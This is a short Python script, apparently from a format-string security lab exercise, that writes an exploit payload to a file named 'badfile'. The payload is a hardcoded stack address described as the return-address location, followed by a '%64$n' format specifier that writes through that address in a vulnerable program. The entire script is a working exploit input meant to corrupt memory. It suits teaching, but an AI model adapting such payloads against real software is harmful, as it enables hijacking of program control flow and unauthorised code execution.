#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xffffd4a8 + 4  # addr of return
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# The line shows how to store the string s at offset 4
fmt  = ("%64$n").encode('latin-1')  # write %n value into the 64th element(addr) 
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
